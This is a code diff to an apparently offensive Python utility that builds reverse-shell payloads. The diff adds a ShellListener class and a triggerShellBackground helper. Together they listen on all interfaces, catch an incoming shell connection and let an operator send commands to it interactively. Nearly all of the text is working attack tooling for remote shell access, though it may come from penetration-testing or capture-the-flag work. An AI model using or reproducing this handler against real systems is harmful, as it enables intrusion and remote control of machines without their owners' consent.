@@ -9,6 +9,65 @@ import threading
 import readline
 import base64
 
+class ShellListener:
+
+    def __init__(self, addr, port):
+        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.bind_addr = addr
+        self.port = port
+        self.on_message = None
+        self.listen_thread = None
+        self.connection = None
+
+    def startBackground(self):
+        self.listen_thread = threading.Thread(target=self.start)
+        self.listen_thread.start()
+        return self.listen_thread
+
+    def start(self):
+        self.running = True
+        self.listen_socket.bind((self.bind_addr, self.port))
+        self.listen_socket.listen()
+        while self.running:
+            self.connection, addr = self.listen_socket.accept()
+            with self.connection:
+                print("[+] Got connection:", addr)
+                while self.running:
+                    data = self.connection.recv(1024)
+                    if not data:
+                        break
+                    if self.on_message:
+                        self.on_message(data)
+                        
+            print("[-] Disconnected")
+            self.connection = None
+
+    def close(self):
+        self.running = False
+        self.sendline("exit")
+        self.listen_socket.close()
+
+    def send(self, data):
+        if self.connection:
+            if isinstance(data, str):
+                data = data.encode()
+            self.connection.sendall(data)
+
+    def sendline(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        data += b"\n"
+        return self.send(data)
+
+    def print_message(self, data):
+        sys.stdout.write(data.decode())
+        sys.stdout.flush()
+
+    def interactive(self):
+        self.on_message = lambda x: self.print_message(x)
+        while self.running and self.connection is not None:
+            self.sendline(input())
+
 def generatePayload(type, local_address, port):
 
     if type == "bash":
@@ -47,6 +106,13 @@ def triggerShell(func, port):
     threading.Thread(target=_wait_and_exec).start()
     spawn_listener(port)
 
+def triggerShellBackground(func, port):   
+    listener = ShellListener("0.0.0.0", port)
+    listener.startBackground()
+    threading.Thread(target=func).start()
+    while listener.connection is None:
+        time.sleep(0.5)
+    return listener
 
 if __name__ == "__main__":
 
